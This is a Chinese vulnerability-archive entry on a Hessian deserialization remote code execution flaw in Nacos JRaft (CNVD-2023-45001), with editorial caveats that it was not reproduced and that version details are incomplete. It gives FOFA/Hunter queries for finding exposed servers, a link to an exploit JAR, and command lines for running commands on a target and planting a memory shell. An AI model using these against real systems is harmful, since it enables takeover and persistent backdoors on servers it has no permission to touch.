---
source: "wy876 漏洞文库"
title: "Nacos存在 Hessian反序列化漏洞"
product: "Nacos JRaft Hessian服务"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CNVD-2023-45001"
referenced_identifiers: ""
identifier_role: "primary"
prerequisites: "7848/Raft服务可达、受影响Nacos/JRaft版本及可用gadget"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-a0afe5a95da4c51a4adfdccc"
entity_id: "ve-a0afe5a95da4c51a4adfdccc"
schema_version: "1"
previous_fofa_unverified: "app.name="
fofa: "icon_hash=\"13942501\""
---

# Nacos存在 Hessian反序列化漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：7848/Raft服务可达、受影响Nacos/JRaft版本及可用gadget
- 证据范围：只有JAR执行/内存马命令，无源码、结果或协议分析，不能验证工具功能

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 版本仅Nacos、缺修复/来源工具作者/CNVD
- fofa误为Hunter字段残缺
- 内存马方式会改变目标运行状态，不能标纯检测
- 需要官方修复及可审源代码链接

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# <font style="color:rgb(51, 51, 51);">一、漏洞简介</font>
<font style="color:rgb(63, 63, 63);">Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。Nacos存在 Hessian反序列化漏洞</font>

# <font style="color:rgb(51, 51, 51);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">Nacos </font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="Nacos"`
+ fofa `icon_hash="13942501"`
+ 特征


# 四、漏洞复现
[NacosRce_jar.zip](https://www.yuque.com/attachments/yuque/0/2024/zip/29512878/1730102385394-3297bb1d-0432-46be-b3dd-d879623eb40a.zip)

执行命令

```plain
java -jar NacosRce.jar http://127.0.0.1:8848/nacos 7848 "whoami"
```


打入内存马

```plain
java -jar NacosRce.jar http://127.0.0.1:8848/nacos 7848 memshell
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ziymxgvn5011of96>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
